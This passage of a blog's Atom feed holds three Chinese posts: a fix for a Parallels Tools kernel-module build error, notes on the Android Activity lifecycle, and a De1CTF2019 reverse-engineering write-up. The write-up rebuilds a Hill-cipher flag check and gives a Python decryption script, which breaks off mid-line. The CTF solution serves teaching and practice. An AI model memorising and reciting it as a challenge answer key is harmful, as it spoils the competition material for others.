    <link href="https://kabeor.github.io/Parallels%E5%AE%89%E8%A3%85Tools%E6%97%B6%20call_tg_sync%E6%8A%A5%E9%94%99%E7%9A%84%E4%BF%AE%E5%A4%8D/"/>
    <id>https://kabeor.github.io/Parallels%E5%AE%89%E8%A3%85Tools%E6%97%B6%20call_tg_sync%E6%8A%A5%E9%94%99%E7%9A%84%E4%BF%AE%E5%A4%8D/</id>
    <published>2020-05-02T16:00:00.000Z</published>
    <updated>2020-05-03T04:37:08.688Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Parallels安装Tools时-call-tg-sync报错的修复"><a href="#Parallels安装Tools时-call-tg-sync报错的修复" class="headerlink" title="Parallels安装Tools时 call_tg_sync报错的修复"></a>Parallels安装Tools时 call_tg_sync报错的修复</h1><h2 id="错误出现"><a href="#错误出现" class="headerlink" title="错误出现"></a>错误出现</h2><p>今天更新Linux kernel后发现Parallels-Tools无法使用了，于是重新安装</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -o exec media&#x2F;cdrom</span><br><span class="line">sudo .&#x2F;install</span><br></pre></td></tr></table></figure></div><p>然而安装失败并建议查看日志，于是分析安装日志</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nano &#x2F;var&#x2F;log&#x2F;parallels-tools-install.log</span><br></pre></td></tr></table></figure></div><p>发现出现错误<code>ERROR: &quot;call_tg_sync&quot; [/usr/lib/parallels-tools/kmods/prl_fs/SharedFolders/Guest/Linux/prl_fs/prl_fs.ko] undefined!</code></p><p>以及最后导致的编译失败</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error: could not build kernel modules</span><br><span class="line">Error: failed to install kernel modules</span><br></pre></td></tr></table></figure></div><p>尝试一番后成功修复</p><h2 id="错误修复"><a href="#错误修复" class="headerlink" title="错误修复"></a>错误修复</h2><p>该错误的出现是由于Linux Kernel的一个commit导致的( <a href="https://github.com/torvalds/linux/commit/39808e451fdf30d20099a92e5185a0acb028d826" target="_blank" rel="noopener">https://github.com/torvalds/linux/commit/39808e451fdf30d20099a92e5185a0acb028d826</a> )</p><p>修复方式</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将Parallels-Tools镜像中的文件拷贝到虚拟机</span></span><br><span class="line">sudo su</span><br><span class="line">mkdir /home/yourname/Desktop/parallels-fixed</span><br><span class="line"><span class="built_in">cd</span> /home/yourname/Desktop/parallels-fixed</span><br><span class="line">mount /media/cdrom</span><br><span class="line">cp -r /media/cdrom ./</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压源码并修改</span></span><br><span class="line"><span class="built_in">cd</span> ./kmods</span><br><span class="line">tar -xzf prl_mod.tar.gz</span><br><span class="line">rm prl_mod.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别编辑以下三个Makefile</span></span><br><span class="line"><span class="comment"># 在第一行加入 </span></span><br><span class="line"><span class="comment"># KBUILD_EXTRA_SYMBOLS := /usr/lib/parallels-tools/kmods/prl_tg/Toolgate/Guest/Linux/prl_tg/Module.symvers</span></span><br><span class="line">nano ./prl_fs/SharedFolders/Guest/Linux/prl_fs/Makefile</span><br><span class="line">nano ./prl_fs/Toolgate/Guest/Linux/prl_tg/Makefile</span><br><span class="line">nano ./prl_vid/Video/Guest/Linux/kmod/Makefile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 压缩还原</span></span><br><span class="line">tar -zcvf prl_mod.tar.gz . dkms.conf Makefile.kmods</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新安装</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">./install</span><br></pre></td></tr></table></figure></div><p>如果没有写错的话就会编译成功，不过还有可能提示建议安装打印机驱动，点ok忽略即可。</p><p>提示reboot点击重启完成安装。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Parallels安装Tools时-call-tg-sync报错的修复&quot;&gt;&lt;a href=&quot;#Parallels安装Tools时-call-tg-sync报错的修复&quot; class=&quot;headerlink&quot; title=&quot;Parallels安装Tools时</summary>
        
      
    
    
    
    <category term="Linux" scheme="https://kabeor.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://kabeor.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Android Activity生命周期</title>
    <link href="https://kabeor.github.io/Android%20Activity%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"/>
    <id>https://kabeor.github.io/Android%20Activity%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/</id>
    <published>2020-04-15T16:00:00.000Z</published>
    <updated>2020-04-16T03:35:05.423Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android-Activity生命周期"><a href="#Android-Activity生命周期" class="headerlink" title="# Android Activity生命周期"></a># Android Activity生命周期</h1><p><a href="https://i.loli.net/2020/04/16/btqRf4vOTJduUez.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/04/16/btqRf4vOTJduUez.png" class="lazyload"></a></p><ul><li><p>onCreate 在Activity第一次被创建时调用onCreate方法。通常在onCreate方法中加载布局，初始化控件。</p></li><li><p>onStart 在Activity变为可视的时候，调用onStart方法。</p></li><li><p>onResume 当Activity处于栈顶，并处于正在运行状态，可以与用户进行交互的时候，调用onResume方法。</p></li><li><p>onPause 当Activity已经失去焦点，且依旧是可视状态时调用onPause方法，此时Activity无法与用户进行交互。</p></li><li><p>onStop 当Activity从可视变为不可视的时候，调用onStop方法。</p></li><li><p>onDestory onDestory方法在Activity被销毁前调用。</p></li><li><p>onRestart onRestart方法在Activity被重新启动时调用，在Activity第一次被创建的时候不会调用。</p></li></ul><h2 id="生命周期变化测试"><a href="#生命周期变化测试" class="headerlink" title="生命周期变化测试"></a>生命周期变化测试</h2><p>重写方法</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStart</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onStart();</span><br><span class="line">    Log.d(TAG,<span class="string">"onStart"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onStop();</span><br><span class="line">    Log.d(TAG,<span class="string">"onStop"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPause</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onPause();</span><br><span class="line">    Log.d(TAG,<span class="string">"onPause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onResume();</span><br><span class="line">    Log.d(TAG,<span class="string">"onResume"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onDestroy();</span><br><span class="line">    Log.d(TAG,<span class="string">"onDestroy"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onRestart</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onRestart();</span><br><span class="line">    Log.d(TAG,<span class="string">"onRestart"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="Normal-Activity"><a href="#Normal-Activity" class="headerlink" title="Normal Activity"></a>Normal Activity</h3><p>程序启动时</p><p><a href="https://i.loli.net/2020/04/16/HMtX3WryQBqOAEx.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/04/16/HMtX3WryQBqOAEx.png" class="lazyload"></a></p><p>进入Text View再点击Back按钮</p><p><a href="https://i.loli.net/2020/04/16/FoCbqxpL8QBJGWm.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/04/16/FoCbqxpL8QBJGWm.png" class="lazyload"></a></p><h3 id="Dialog-Activity"><a href="#Dialog-Activity" class="headerlink" title="Dialog Activity"></a>Dialog Activity</h3><p>程序启动时</p><p><a href="https://i.loli.net/2020/04/16/HMtX3WryQBqOAEx.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/04/16/HMtX3WryQBqOAEx.png" class="lazyload"></a></p><p>显示Dialog并点击空白回到主activity</p><p><a href="https://i.loli.net/2020/04/16/fBibcuOdGQqEMID.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/04/16/fBibcuOdGQqEMID.png" class="lazyload"></a></p><h3 id="销毁窗口"><a href="#销毁窗口" class="headerlink" title="销毁窗口"></a>销毁窗口</h3><p>点击back回到系统主页面</p><p><a href="https://i.loli.net/2020/04/16/mafCoUKZp6GMOAW.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/04/16/mafCoUKZp6GMOAW.png" class="lazyload"></a></p><h2 id="Activity启动模式"><a href="#Activity启动模式" class="headerlink" title="Activity启动模式"></a>Activity启动模式</h2><p> <strong>standard、singleTop、singleTask、singleInstance</strong></p><blockquote><p>standard</p></blockquote><p>默认模式</p><blockquote><p>singleTop</p></blockquote><p>栈顶复用模式，假如Activity处于栈顶，再次启动这个Activity的时候，复用该Activity。</p><blockquote><p>singleTask</p></blockquote><p>栈内复用模式，只要在同一个栈内启动模式为栈内复用模式的Activity，再次启动的时候就可以复用。</p><blockquote><p>singleInstance</p></blockquote><p>单实例模式，被设置启动模式为单实例模式的Activity独自享有一个Activity栈。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Android-Activity生命周期&quot;&gt;&lt;a href=&quot;#Android-Activity生命周期&quot; class=&quot;headerlink&quot; title=&quot;# Android Activity生命周期&quot;&gt;&lt;/a&gt;# Android</summary>
        
      
    
    
    
    <category term="Android" scheme="https://kabeor.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="https://kabeor.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF2019 Signal vm 1&amp;2</title>
    <link href="https://kabeor.github.io/De1CTF2019-Signal_vm/"/>
    <id>https://kabeor.github.io/De1CTF2019-Signal_vm/</id>
    <published>2020-04-01T16:00:00.000Z</published>
    <updated>2020-04-06T02:06:06.237Z</updated>
    
    <content type="html"><![CDATA[<h1 id="De1CTF2019-Signal-vm-1-amp-2"><a href="#De1CTF2019-Signal-vm-1-amp-2" class="headerlink" title="De1CTF2019 Signal vm 1&amp;2"></a>De1CTF2019 Signal vm 1&amp;2</h1><p>进入main分析</p><p><a href="https://i.loli.net/2020/04/02/dzgMT2VywvRYNkl.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/04/02/dzgMT2VywvRYNkl.png" class="lazyload"></a></p><p>大概就是父进程fork一个子进程，接下来调试子进程，子进程进行vm的操作，调试这部分操作可以在下图这里看出：</p><p><a href="https://i.loli.net/2020/04/02/hX4Udt6Lxk3uN7f.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/04/02/hX4Udt6Lxk3uN7f.png" class="lazyload"></a></p><h2 id="VM1"><a href="#VM1" class="headerlink" title="VM1"></a>VM1</h2><p>内存数据如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">65, 108, 109, 111, 115, 116, 32, 104, 101, 97, 118, 101, 110, 32, 119, 101, 115, 116, 32, 118, 105, 114, 103, 105, 110, 105, 97, 44, 32, 98, 108, 117, 101, 32, 114, 105, 100, 103, 101, 32, 109, 111, 117, 110, 116, 97, 105, 110, 115, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 214, 77, 45, 133, 119, 151, 96, 98, 43, 136, 134, 202, 114, 151, 235, 137, 152, 243, 120, 38, 131, 41, 94, 39, 67, 251, 184, 23, 124, 206, 58, 115, 207, 251, 199, 156, 96, 175, 156, 200, 117, 205, 55, 123, 59, 155, 78, 195, 218, 216, 206, 113, 43, 48, 104, 70, 11, 255, 60, 241, 241, 69, 196, 208, 196, 255, 81, 241, 136, 81, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br></pre></td></tr></table></figure></div><p>通过异常处理进入vm的handle</p><p>分析vm操作指令</p><p><a href="https://i.loli.net/2020/04/02/VAbnRUxtY86SJWL.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/04/02/VAbnRUxtY86SJWL.png" class="lazyload"></a></p><p><a href="https://i.loli.net/2020/04/02/nhB6sKYwRVaDjFm.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/04/02/nhB6sKYwRVaDjFm.png" class="lazyload"></a></p><p>最终分析出vm中实现了Hill cipher，算法如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> reg[<span class="number">50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">uint8_t</span> key[<span class="number">50</span>] = &#123;<span class="number">65</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">32</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">100</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">115</span>,<span class="number">00</span>&#125;;</span><br><span class="line"><span class="keyword">uint8_t</span> plain[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">uint8_t</span> cipher[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">uint8_t</span> cmp[<span class="number">100</span>] = &#123;<span class="number">214</span>, <span class="number">77</span>, <span class="number">45</span>, <span class="number">133</span>, <span class="number">119</span>, <span class="number">151</span>, <span class="number">96</span>, <span class="number">98</span>, <span class="number">43</span>, <span class="number">136</span>, <span class="number">134</span>, <span class="number">202</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">235</span>, <span class="number">137</span>, <span class="number">152</span>, <span class="number">243</span>, <span class="number">120</span>, <span class="number">38</span>, <span class="number">131</span>, <span class="number">41</span>, <span class="number">94</span>, <span class="number">39</span>, <span class="number">67</span>, <span class="number">251</span>, <span class="number">184</span>, <span class="number">23</span>, <span class="number">124</span>, <span class="number">206</span>, <span class="number">58</span>, <span class="number">115</span>, <span class="number">207</span>, <span class="number">251</span>, <span class="number">199</span>, <span class="number">156</span>, <span class="number">96</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">200</span>, <span class="number">117</span>, <span class="number">205</span>, <span class="number">55</span>, <span class="number">123</span>, <span class="number">59</span>, <span class="number">155</span>, <span class="number">78</span>, <span class="number">195</span>, <span class="number">218</span>, <span class="number">216</span>, <span class="number">206</span>, <span class="number">113</span>, <span class="number">43</span>, <span class="number">48</span>, <span class="number">104</span>, <span class="number">70</span>, <span class="number">11</span>, <span class="number">255</span>, <span class="number">60</span>, <span class="number">241</span>, <span class="number">241</span>, <span class="number">69</span>, <span class="number">196</span>, <span class="number">208</span>, <span class="number">196</span>, <span class="number">255</span>, <span class="number">81</span>, <span class="number">241</span>, <span class="number">136</span>, <span class="number">81</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Almost heaven west virginia, blue ridge mountains</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> i,j,k;</span><br><span class="line">    <span class="keyword">uint8_t</span> tmp = <span class="number">0</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(plain[i]!=<span class="number">0</span>)</span><br><span class="line">        i++;</span><br><span class="line">    <span class="keyword">if</span>(i!=<span class="number">70</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">7</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            tmp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">0</span>;k&lt;<span class="number">7</span>;k++)</span><br><span class="line">            &#123;</span><br><span class="line">                tmp+=plain[i*<span class="number">7</span>+k]*key[k*<span class="number">7</span>+j];</span><br><span class="line">            &#125;</span><br><span class="line">            cipher[i*<span class="number">7</span>+j] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">70</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(cipher[i]!=cmp[i])</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Check up:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, plain);</span><br><span class="line">    <span class="keyword">if</span>(check())</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"True."</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"False."</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>key和密文都已知，直接解密即可</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetReverse</span><span class="params">(a,n)</span>:</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">y = <span class="number">1</span></span><br><span class="line">q = n</span><br><span class="line">p = a</span><br><span class="line">z = q // p</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span> != p <span class="keyword">and</span> <span class="number">1</span> != q):</span><br><span class="line">t = p</span><br><span class="line">p = q % p</span><br><span class="line">q = t</span><br><span class="line"></span><br><span class="line">t = y</span><br><span class="line">y = x - y * z</span><br><span class="line">x = t</span><br><span class="line">z = q // p</span><br><span class="line">y = y % n</span><br><span class="line"><span class="keyword">if</span>(y &lt; <span class="number">0</span>):</span><br><span class="line">y += n</span><br><span class="line"><span class="keyword">return</span> y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CheckReverse</span><span class="params">(a,n)</span>:</span></span><br><span class="line">p = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span>(p*p&lt;n):</span><br><span class="line"><span class="keyword">if</span>(a%p == n%p <span class="keyword">and</span> <span class="number">0</span> == a%p):</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">p+=<span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MatI</span><span class="params">(m,n)</span>:</span></span><br><span class="line">rank = len(m)</span><br><span class="line">mm = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,rank)] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,rank)]</span><br><span class="line">A = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2</span>*rank)] <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,rank)]</span><br><span class="line">T = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2</span>*rank)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, rank):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, rank*<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span>(j &lt; rank):</span><br><span class="line">A[i][j] = m[i,j]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span>(rank == j-i):</span><br><span class="line">A[i][j] = <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">A[i][j] = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, rank):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(j, rank):</span><br><span class="line"><span class="keyword">if</span>(CheckReverse(A[i][j], n)):</span><br><span class="line">a_1 = GetReverse(A[i][j], n)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, rank*<span class="number">2</span>):</span><br><span class="line">A[i][k] *= a_1</span><br><span class="line">A[i][k] %= n</span><br><span class="line">T[k] = A[i][k]</span><br><span class="line">A[i][k] = A[j][k]</span><br><span class="line">A[j][k] = T[k]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span>(rank<span class="number">-1</span> == i):</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, rank):</span><br><span class="line"><span class="keyword">if</span>(i != j):</span><br><span class="line">t = A[i][j]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, rank*<span class="number">2</span>):</span><br><span class="line">A[i][k] -= t * A[j][k]</span><br><span class="line">A[i][k] %= n</span><br><span class="line"><span class="keyword">if</span>(A[i][k]&lt;<span class="number">0</span>):</span><br><span class="line">A[i][k] += n</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, rank):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, rank):</span><br><span class="line">mm[i][j] = A[i][j+rank]</span><br><span class="line"><span class="keyword">return</span> mat(mm)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = list(<span class="string">b'Almost heaven west virginia, blue ridge mountains'</span>)</span><br><span class="line">cipher = [  <span class="number">214</span>,  <span class="number">77</span>,  <span class="number">45</span>, <span class="number">133</span>, <span class="number">119</span>, <span class="number">151</span>,  <span class="number">96</span>,  <span class="number">98</span>,  <span class="number">43</span>, <span class="number">136</span>, </span><br><span class="line">  <span class="number">134</span>, <span class="number">202</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">235</span>, <span class="number">137</span>, <span class="number">152</span>, <span class="number">243</span>, <span class="number">120</span>,  <span class="number">38</span>, </span><br><span class="line">  <span class="number">131</span>,  <span class="number">41</span>,  <span class="number">94</span>,  <span class="number">39</span>,  <span class="number">67</span>, <span class="number">251</span>, <span class="number">184</span>,  <span class="number">23</span>, <span class="number">124</span>, <span class="number">206</span>, </span><br><span class="line">   <span class="number">58</span>, <span class="number">115</span>, <span class="number">207</span>, <span class="number">251</span>, <span class="number">199</span>, <span class="number">156</span>,  <span class="number">96</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">200</span>, </span><br><span class="line">  <span class="number">117</span>, <span class="number">205</span>,  <span class="number">55</span>, <span class="number">123</span>,  <span class="number">59</span>, <span class="number">155</span>,  <span class="number">78</span>, <span class="number">195</span>, <span class="number">218</span>, <span class="number">216</span>, </span><br><span class="line">  <span class="number">206</span>, <span class="number">113</span>,  <span class="number">43</span>,  <span class="number">48</span>, <span class="number">104</span>,  <span class="number">70</span>,  <span class="number">11</span>, <span class="number">255</span>,  <span class="number">60</span>, <span class="number">241</span>, </span><br><span class="line">  <span class="number">241</span>,  <span class="number">69</span>, <span class="number">196</span>, <span class="number">208</span>, <span class="number">196</span>, <span class="number">255</span>,  <span class="number">81</span>, <span class="number">241</span>, <span class="number">136</span>,  <span class="number">81</span>];</span><br><span class="line">mK = mat(key).reshape(<span class="number">7</span>,<span class="number">7</span>)</span><br><span class="line">mC = mat(cipher).reshape(<span class="number">10</span>,<span class="number">7</span>)</span><br><span class="line">mKI = MatI(mK,<span class="number">256</span>)</span><br><span class="line">mP = mC*mKI%<span 